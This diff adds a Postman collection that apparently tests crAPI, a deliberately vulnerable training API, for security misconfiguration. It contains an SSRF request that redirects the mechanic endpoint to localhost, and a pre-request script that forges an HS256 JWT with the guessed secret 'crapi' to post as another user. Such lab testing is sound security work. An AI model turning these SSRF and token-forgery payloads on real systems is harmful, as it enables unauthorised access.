@@ -1,0 +1,158 @@
+{
+	"info": {
+		"_postman_id": "53bfbf30-cf0f-41bb-9926-9cb57848fd71",
+		"name": "API07:2019 Security Misconfiguration",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "20999705"
+	},
+	"item": [
+		{
+			"name": "Server-Side Request Forgery Variation 2",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "{{token}}",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"mechanic_api\": \"http://localhost:8000/workshop/api/mechanic/receive_report\",\n    \"mechanic_code\": \"TRAC_JME\",\n    \"number_of_repeats\": 1,\n    \"problem_details\": \"asd\",\n    \"repeat_request_if_failed\": false,\n    \"vin\": \"7GEQK70ITIF544515\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{crapi-web}}/workshop/api/merchant/contact_mechanic",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"workshop",
+						"api",
+						"merchant",
+						"contact_mechanic"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "JWT Payload Data Violation",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"exec": [
+							"function base64url(source) {",
+							"\t// Encode in classical base64",
+							"\tencodedSource = CryptoJS.enc.Base64.stringify(source);",
+							"",
+							"\t// Remove padding equal characters",
+							"\tencodedSource = encodedSource.replace(/=+$/, '');",
+							"",
+							"\t// Replace characters according to base64url specifications",
+							"\tencodedSource = encodedSource.replace(/\\+/g, '-');",
+							"\tencodedSource = encodedSource.replace(/\\//g, '_');",
+							"",
+							"\treturn encodedSource;",
+							"}",
+							"",
+							"function addIAT(request) {",
+							"\tvar iat = Math.floor(Date.now() / 1000);",
+							"\trequest.iat = iat;",
+							"\treturn request;",
+							"}",
+							"",
+							"function addEXP(request) {",
+							"    var exp = Math.floor(Date.now() / 1000) + 3600;",
+							"    request.exp = exp;",
+							"    return request",
+							"}",
+							"",
+							"",
+							"var header = {",
+							"\t\"typ\": \"JWT\",",
+							"\t\"alg\": \"HS256\"",
+							"};",
+							"",
+							"var data = {",
+							"\t\"sub\": \"mike@fake.com\",",
+							"    \"ssn\": \"555-55-5555\"",
+							"};",
+							"",
+							"data = addIAT(data);",
+							"data = addEXP(data);",
+							"",
+							"var secret = 'crapi';",
+							"",
+							"// encode header",
+							"var stringifiedHeader = CryptoJS.enc.Utf8.parse(JSON.stringify(header));",
+							"var encodedHeader = base64url(stringifiedHeader);",
+							"",
+							"// encode data",
+							"var stringifiedData = CryptoJS.enc.Utf8.parse(JSON.stringify(data));",
+							"var encodedData = base64url(stringifiedData);",
+							"",
+							"// build token",
+							"var token = encodedHeader + \".\" + encodedData;",
+							"",
+							"// sign token",
+							"var signature = CryptoJS.HmacSHA256(token, secret);",
+							"signature = base64url(signature);",
+							"var signedToken = token + \".\" + signature;",
+							"console.log(signedToken)",
+							"pm.globals.set('badToken', signedToken)"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "{{badToken}}",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"content\": \"My car is broken\",\n    \"title\": \"hello world\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{crapi-web}}/community/api/v2/community/posts",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"community",
+						"api",
+						"v2",
+						"community",
+						"posts"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
